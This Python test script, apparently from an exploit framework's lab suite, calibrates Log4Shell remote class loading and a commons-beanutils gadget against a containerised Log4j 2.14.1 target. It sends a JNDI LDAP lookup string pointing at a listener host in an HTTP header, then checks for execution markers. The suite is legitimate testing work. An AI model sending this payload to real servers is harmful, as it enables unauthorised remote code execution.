"""Calibrate real remote class loading and Beanutils execution before Framework."""
import hashlib
import json
import os
from pathlib import Path
import subprocess
import sys
import time
import urllib.parse

sys.dont_write_bytecode = True
sys.path.insert(0, str(Path(__file__).resolve().parent.parent / 'log4shell_http'))
from native_probe import NativeTarget

runtime = json.loads(Path(os.environ['MODULE_TARGET_RUNTIME']).read_text())
client = NativeTarget(runtime)
artifacts = Path(runtime['artifacts'])
proof = {}
server = None
try:
    meta = client.request('/meta')
    version = os.environ.get('LOG4SHELL_VERSION', '2.14.1')
    trust = os.environ.get('LOG4SHELL_TRUST_CODEBASE', 'true')
    assert meta['version'] == meta['implementation_version'] == version
    assert meta['trust_url_codebase'] == trust
    assert meta['java_version'] == '1.8.0_412' and meta['mode'] == 'log4j'
    catalog = json.loads(Path(__file__).with_name('vendor.json').read_text())['artifacts']
    log4j = json.loads(Path(__file__).parent.parent.joinpath('log4shell_http/vendor.json').read_text())['artifacts']
    selected = catalog + [row for row in log4j if row['version'] == version]
    actual_hashes = client.command('sha256sum', *['vendor/' + row['file'] for row in selected])
    assert all(row['sha256'] + '  vendor/' + row['file'] in actual_hashes for row in selected)
    logs = subprocess.check_output(runtime['compose'] + ['logs', '--no-color', 'target'], text=True)
    boot = json.loads(next(line.split('EXECUTION_TARGET_BOOT=', 1)[1] for line in logs.splitlines() if 'EXECUTION_TARGET_BOOT=' in line))
    assert boot['pid'] == meta['pid'] and boot['trust_serial_data'] == 'true'
    for component, filename in [('beanutils','commons-beanutils-1.9.2.jar'),('collections','commons-collections-3.1.jar'),('logging','commons-logging-1.2.jar')]:
        assert boot[component + '_source'] == 'file:/opt/module-target/vendor/' + filename
    for filename in ['native-proof.jar', 'beanutils.bin']:
        subprocess.run(runtime['compose'] + ['cp', 'target:/opt/module-target/native/' + filename, str(artifacts / filename)], check=True, capture_output=True, timeout=20)
    oracle = 'test/module_targets/log4shell_execution/native_oracle.py'
    output = (artifacts / 'native-oracle-process.log').open('w')
    server = subprocess.Popen(runtime['compose'] + ['exec', '-T', 'framework', 'python3', '-u', oracle, str(artifacts), runtime['listener_host']], stdin=subprocess.DEVNULL, stdout=output, stderr=subprocess.STDOUT)
    deadline = time.monotonic() + 15
    while not (artifacts / 'native-oracle-ready.json').exists():
        assert server.poll() is None, 'Oracle exited during startup'
        if time.monotonic() > deadline:
            raise TimeoutError('Oracle startup')
        time.sleep(0.05)
    controls = []
    for kind in ['remote','gadget']:
        path = '/tmp/module-target-log4shell-native-' + ('class' if kind == 'remote' else 'gadget')
        client.command('test', '!', '-e', path)
        before = client.request('/events')['sequence']
        expression = '${jndi:ldap://' + runtime['listener_host'] + ':1388/cn=' + kind + '}'
        client.request('/header/', headers={'X-Log4j-Input':expression})
        result = subprocess.run(runtime['compose'] + ['exec','-T','target','sh','-c','if test -f "$1"; then cat "$1"; fi','native',path], capture_output=True,text=True,timeout=15)
        assert result.returncode == 0
        expected = version == '2.14.1' and (kind == 'gadget' or trust == 'true')
        assert bool(result.stdout) == expected, (kind, meta, result.stdout, logs[-1500:])
        if expected:
            prefix = 'native-remote-class:' if kind == 'remote' else 'native-beanutils:'
            assert result.stdout.startswith(prefix + meta['pid'] + '@') and len(result.stdout.splitlines()) == 1
        events = client.request('/events?after=' + str(before))['events']
        assert not any(row['kind'] in ['http_error', 'collector_error', 'native_ldap'] for row in events)
        controls.append(dict(kind=kind,expected_execution=expected,marker=result.stdout,events=events))
        client.command('rm','-f','--',path)
        client.command('test','!','-e',path)
    wire = [json.loads(line) for line in (artifacts / 'native-oracle-events.jsonl').read_text().splitlines()]
    searches = [row for row in wire if row['kind']=='ldap' and row['operation']==99]
    if version == '2.14.1':
        assert {row['base_dn'] for row in searches} == {'cn=remote','cn=gadget'}
    else:
        assert searches == []
    assert bool([row for row in wire if row['kind']=='http_jar']) == (version=='2.14.1' and trust=='true')
    assert not any(row['kind']=='ldap_error' for row in wire), wire
    for row in wire:
        if row['kind']=='http_jar':assert row['sha256']==hashlib.sha256((artifacts/'native-proof.jar').read_bytes()).hexdigest()
        if row.get('serialized_sha256'):assert row['serialized_sha256']==hashlib.sha256((artifacts/'beanutils.bin').read_bytes()).hexdigest()
    proof = dict(metadata=meta,bootstrap=boot,controls=controls,wire=wire,sha256={name:hashlib.sha256((artifacts/name).read_bytes()).hexdigest() for name in ['native-proof.jar','beanutils.bin']})
finally:
    if server is not None:
        shutdown = subprocess.run(runtime['compose'] + ['exec','-T','framework','python3','-c',"import urllib.request;urllib.request.urlopen('http://127.0.0.1:8088/stop').read()"],capture_output=True,text=True,timeout=15)
        proof['oracle_shutdown'] = dict(exitstatus=shutdown.returncode,stdout=shutdown.stdout,stderr=shutdown.stderr)
        try:proof['oracle_process_exit'] = server.wait(timeout=15)
        except subprocess.TimeoutExpired:
            server.terminate();proof['oracle_process_exit'] = server.wait(timeout=10)
        output.close()
    (artifacts/'native-execution.json').write_text(json.dumps(dict(proof=proof,requests=client.requests,commands=client.commands),indent=2)+'\n')
assert proof['oracle_shutdown']['exitstatus']==0 and proof['oracle_process_exit']==0
print(json.dumps(proof))
